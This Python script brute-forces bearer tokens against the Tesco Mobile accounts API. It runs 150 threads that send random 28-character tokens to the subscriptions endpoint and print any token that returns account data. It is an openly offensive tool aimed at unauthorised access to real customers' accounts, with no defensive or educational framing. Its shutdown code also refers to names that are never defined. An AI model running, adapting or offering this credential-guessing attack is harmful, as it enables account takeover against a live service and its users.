import time
import requests
import random
import string
from colorama import *; init()
from concurrent.futures import ThreadPoolExecutor

startTime = time.time()

tries = 0

def lol(thread):

    global tries

    letters = string.ascii_letters + string.digits

    while True:
        key = ''.join(random.choice(letters) for i in range(28)) # TESCO BEARER TOKENS ARE 28 LONG

        headers = {'Authorization': f'Bearer {key}'}

        r = requests.get('https://api.tescomobile.com/app/accounts/v2/subscriptions/', headers = headers)

        tries += 1
        tps = round(tries / ((time.time() - startTime) / 60))

        if 'Invalid Access Token' in r.text:
            print(f'[THREAD {thread}] tries:{tries} | {tps}/min | {Fore.LIGHTRED_EX}-{Fore.RESET} resp {r.status_code} | {key} {Fore.LIGHTRED_EX}invalid{Fore.RESET}  |  {r.json()["fault"]}')
        else:
            print(f'[THREAD {thread}] tries:{tries} | {tps}/min | {Fore.LIGHTGREEN_EX}+{Fore.RESET} resp {r.status_code} | {key} {Fore.LIGHTGREEN_EX}works!{Fore.RESET}  |  {r.json()}')
            print(f'[THREAD {thread}] shutting down...')
            thread_executor.shutdown(wait=False)
            for t in thread_executor._threads:
                terminate_thread(t)

if __name__ == '__main__':
    with ThreadPoolExecutor(max_workers=150) as ex:
        for x in range(150):
            ex.submit(lol, x)
